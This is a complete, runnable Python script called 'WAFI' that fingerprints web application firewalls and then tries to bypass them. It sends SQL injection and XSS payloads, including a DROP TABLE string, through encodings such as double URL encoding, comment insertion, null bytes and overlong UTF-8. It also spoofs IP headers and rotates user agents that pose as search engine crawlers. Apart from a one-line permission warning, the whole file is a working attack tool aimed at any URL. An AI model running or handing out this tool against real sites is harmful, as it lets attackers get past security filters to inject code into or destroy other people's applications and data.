#!/usr/bin/env python3
# =============================================================
#  WAFI - WAF Detection & Bypass Toolkit
#  Usage: python wafi.py -u https://target.com/page?id=1
#  WARNING: Use only on systems you own or have permission to test.
# =============================================================

import argparse
import sys
import time
import random
import urllib.parse
import json
from itertools import product
from datetime import datetime

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] Install requests: pip install requests")
    sys.exit(1)

BANNER = """
  ╔═══════════════════════════════════════╗
  ║   WAFI v1.0                           ║
  ║   WAF Detection & Bypass Toolkit      ║
  ╚═══════════════════════════════════════╝
"""

# ─────────────────────────────────────────
#  WAF FINGERPRINTS
# ─────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
        "body": ["cloudflare", "cf-ray", "Attention Required"],
        "status": [403, 503],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body": ["AWS WAF", "Request blocked"],
        "status": [403],
    },
    "ModSecurity": {
        "headers": ["mod_security", "modsecurity"],
        "body": ["ModSecurity", "Not Acceptable!", "406 Not Acceptable"],
        "status": [406, 403],
    },
    "Akamai": {
        "headers": ["akamai-origin-hop", "x-akamai-transformed"],
        "body": ["AkamaiGHost", "Access Denied", "Reference #"],
        "status": [403],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "body": ["incapsula", "Incapsula incident", "_Incapsula_Resource"],
        "status": [403],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body": ["Sucuri WebSite Firewall", "Access Denied - Sucuri"],
        "status": [403],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-cnection", "ts"],
        "body": ["The requested URL was rejected", "BIG-IP"],
        "status": [403],
    },
    "Fortinet FortiWeb": {
        "headers": ["fortiwafsid"],
        "body": ["FortiWeb", "Web Application Firewall"],
        "status": [403],
    },
}

# ─────────────────────────────────────────
#  BYPASS PAYLOADS
# ─────────────────────────────────────────

# Base payloads (SQLi + XSS mixed for demonstration)
BASE_PAYLOADS = [
    "' OR '1'='1",
    "1 UNION SELECT NULL--",
    "<script>alert(1)</script>",
    "'; DROP TABLE users--",
    "1 AND 1=1",
    "admin'--",
    "<img src=x onerror=alert(1)>",
    "1' ORDER BY 1--",
]

# Encoding bypass techniques
def url_encode(payload: str) -> str:
    return urllib.parse.quote(payload)

def double_url_encode(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload))

def html_entity_encode(payload: str) -> str:
    result = ""
    for ch in payload:
        result += f"&#{ord(ch)};"
    return result

def hex_encode(payload: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in payload)

def unicode_encode(payload: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in payload)

def case_variation(payload: str) -> str:
    result = ""
    for i, ch in enumerate(payload):
        result += ch.upper() if i % 2 == 0 else ch.lower()
    return result

def comment_injection(payload: str) -> str:
    """Insert SQL comments between keywords to break WAF pattern matching."""
    return payload.replace(" ", "/**/").replace("OR", "O/**/R").replace("AND", "A/**/ND")

def whitespace_variation(payload: str) -> str:
    """Replace spaces with alternative whitespace chars."""
    chars = ["\t", "\n", "\r", "%09", "%0a", "%0d", "%20"]
    return payload.replace(" ", random.choice(chars))

def null_byte_injection(payload: str) -> str:
    return payload + "%00"

def overlong_utf8(payload: str) -> str:
    """Simulate overlong UTF-8 encoding for < and >."""
    return payload.replace("<", "%C0%BC").replace(">", "%C0%BE")

BYPASS_TECHNIQUES = {
    "URL Encode":          url_encode,
    "Double URL Encode":   double_url_encode,
    "HTML Entity Encode":  html_entity_encode,
    "Hex Encode":          hex_encode,
    "Case Variation":      case_variation,
    "Comment Injection":   comment_injection,
    "Whitespace Variation":whitespace_variation,
    "Null Byte Injection": null_byte_injection,
    "Overlong UTF-8":      overlong_utf8,
}

# ─────────────────────────────────────────
#  EVASION HEADERS
# ─────────────────────────────────────────

EVASION_HEADERS_LIST = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/7.68.0",
]

# ─────────────────────────────────────────
#  CORE FUNCTIONS
# ─────────────────────────────────────────

def make_request(url: str, params: dict = None, headers: dict = None,
                 timeout: int = 10, verify: bool = False) -> requests.Response | None:
    base_headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }
    if headers:
        base_headers.update(headers)
    try:
        resp = requests.get(url, params=params, headers=base_headers,
                            timeout=timeout, verify=verify, allow_redirects=True)
        return resp
    except requests.exceptions.RequestException as e:
        print(f"\n  [!] Request error: {e}")
        return None


def fingerprint_waf(url: str, timeout: int = 10) -> list[str]:
    """
    Send a clearly malicious payload and analyse the response to fingerprint WAFs.
    Returns list of detected WAF names.
    """
    probe_url = url + ("&" if "?" in url else "?") + "waf_test=<script>alert(1)</script>"
    resp = make_request(probe_url, timeout=timeout)
    if not resp:
        return []

    detected = []
    resp_headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
    body_lower = resp.text.lower()

    for waf_name, sigs in WAF_SIGNATURES.items():
        score = 0
        for h in sigs["headers"]:
            if h.lower() in resp_headers_lower:
                score += 2
        for keyword in sigs["body"]:
            if keyword.lower() in body_lower:
                score += 2
        if resp.status_code in sigs["status"]:
            score += 1
        if score >= 2:
            detected.append(waf_name)

    return detected


def get_baseline(url: str, param: str, timeout: int) -> tuple[int, int]:
    """Get baseline response (status code + body length) for a benign request."""
    resp = make_request(url, params={param: "hello123"}, timeout=timeout)
    if resp:
        return resp.status_code, len(resp.text)
    return 200, 0


def is_blocked(resp: requests.Response, baseline_status: int, baseline_len: int) -> bool:
    """Heuristically determine if a response looks blocked by WAF."""
    if resp is None:
        return True
    if resp.status_code in [403, 406, 429, 503]:
        return True
    # Body length drastically different (WAF error page)
    if baseline_len > 0 and len(resp.text) < baseline_len * 0.3:
        return True
    return False


def run_bypass_scan(url: str, param: str, timeout: int, delay: float,
                    output_file: str | None) -> list[dict]:
    """
    Test every combination of payload × bypass technique.
    Returns list of successful bypass results.
    """
    print(f"\n  [*] Getting baseline for param '{param}'...")
    baseline_status, baseline_len = get_baseline(url, param, timeout)
    print(f"  [*] Baseline — status: {baseline_status}, body length: {baseline_len}")
    print(f"\n  [*] Testing {len(BASE_PAYLOADS)} payloads × {len(BYPASS_TECHNIQUES)} techniques "
          f"= {len(BASE_PAYLOADS) * len(BYPASS_TECHNIQUES)} requests\n")
    print(f"  {'Technique':<25} {'Payload (truncated)':<35} {'Status':<8} {'Result'}")
    print(f"  {'─'*25} {'─'*35} {'─'*8} {'─'*10}")

    results = []
    total = len(BASE_PAYLOADS) * len(BYPASS_TECHNIQUES)
    done = 0

    for payload in BASE_PAYLOADS:
        for tech_name, tech_fn in BYPASS_TECHNIQUES.items():
            done += 1
            encoded = tech_fn(payload)
            resp = make_request(url, params={param: encoded}, timeout=timeout)

            blocked = is_blocked(resp, baseline_status, baseline_len)
            status = resp.status_code if resp else "ERR"
            result_str = "BLOCKED" if blocked else "✓ BYPASSED"
            short_payload = (encoded[:32] + "...") if len(encoded) > 35 else encoded

            print(f"  {tech_name:<25} {short_payload:<35} {str(status):<8} {result_str}")

            if not blocked and resp:
                results.append({
                    "technique": tech_name,
                    "payload": payload,
                    "encoded": encoded,
                    "status": status,
                    "body_len": len(resp.text),
                })

            if delay > 0:
                time.sleep(delay)

    return results


def header_evasion_test(url: str, timeout: int) -> list[dict]:
    """Test IP spoofing headers to bypass IP-based WAF rules."""
    print(f"\n  {'Header':<35} {'Value':<20} {'Status':<8} {'Result'}")
    print(f"  {'─'*35} {'─'*20} {'─'*8} {'─'*10}")

    results = []
    probe_url = url + ("&" if "?" in url else "?") + "test=<script>alert(1)</script>"

    baseline_resp = make_request(probe_url, timeout=timeout)
    baseline_blocked = baseline_resp is None or baseline_resp.status_code in [403, 406, 503]

    for header_dict in EVASION_HEADERS_LIST:
        resp = make_request(probe_url, headers=header_dict, timeout=timeout)
        h_name = list(header_dict.keys())[0]
        h_val = list(header_dict.values())[0]
        status = resp.status_code if resp else "ERR"
        bypassed = resp is not None and resp.status_code not in [403, 406, 503]
        result_str = "✓ BYPASSED" if (bypassed and baseline_blocked) else ("ALLOWED" if bypassed else "BLOCKED")
        print(f"  {h_name:<35} {h_val:<20} {str(status):<8} {result_str}")
        if bypassed and baseline_blocked:
            results.append({"header": h_name, "value": h_val, "status": status})

    return results


def print_summary(bypass_results: list[dict], header_results: list[dict]) -> None:
    print(f"\n{'═'*60}")
    print("  SUMMARY")
    print(f"{'═'*60}")

    if bypass_results:
        print(f"\n  [✓] {len(bypass_results)} payload bypass(es) found:\n")
        for r in bypass_results:
            print(f"    Technique : {r['technique']}")
            print(f"    Payload   : {r['payload']}")
            print(f"    Encoded   : {r['encoded'][:60]}")
            print(f"    Status    : {r['status']}")
            print()
    else:
        print("\n  [-] No payload bypasses found.")

    if header_results:
        print(f"\n  [✓] {len(header_results)} header bypass(es) found:\n")
        for r in header_results:
            print(f"    Header : {r['header']}: {r['value']}  (status {r['status']})")
    else:
        print("\n  [-] No header evasion bypasses found.")


# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="WAFI - WAF Detection & Bypass Toolkit",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-u", "--url",      required=True, help="Target URL (e.g. https://target.com/search?q=test)")
    parser.add_argument("-p", "--param",    default="q",   help="GET parameter to fuzz (default: q)")
    parser.add_argument("-t", "--timeout",  default=10, type=int, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-d", "--delay",    default=0.3, type=float, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("-o", "--output",   default=None, help="Save results to JSON file")
    parser.add_argument("--no-fingerprint", action="store_true", help="Skip WAF fingerprinting")
    parser.add_argument("--no-headers",     action="store_true", help="Skip header evasion test")
    parser.add_argument("--no-bypass",      action="store_true", help="Skip payload bypass scan")

    args = parser.parse_args()

    print(f"  [*] Target  : {args.url}")
    print(f"  [*] Param   : {args.param}")
    print(f"  [*] Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*60}")

    all_results = {"url": args.url, "param": args.param, "waf": [], "bypasses": [], "header_evasions": []}

    # Step 1: WAF Fingerprinting
    if not args.no_fingerprint:
        print("\n  [*] Step 1: WAF Fingerprinting...")
        wafs = fingerprint_waf(args.url, timeout=args.timeout)
        if wafs:
            print(f"  [!] WAF Detected: {', '.join(wafs)}")
            all_results["waf"] = wafs
        else:
            print("  [-] No known WAF fingerprinted (may be custom or not present)")

    # Step 2: Payload Bypass Scan
    bypass_results = []
    if not args.no_bypass:
        print(f"\n  [*] Step 2: Payload Bypass Scan on param '{args.param}'...")
        bypass_results = run_bypass_scan(args.url, args.param, args.timeout, args.delay, args.output)
        all_results["bypasses"] = bypass_results

    # Step 3: Header Evasion
    header_results = []
    if not args.no_headers:
        print(f"\n  [*] Step 3: Header Evasion Test...")
        header_results = header_evasion_test(args.url, timeout=args.timeout)
        all_results["header_evasions"] = header_results

    # Summary
    print_summary(bypass_results, header_results)

    # Save output
    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_results, f, indent=2)
        print(f"\n  [*] Results saved to: {args.output}")

    print(f"\n  [*] Done at {datetime.now().strftime('%H:%M:%S')}\n")


if __name__ == "__main__":
    main()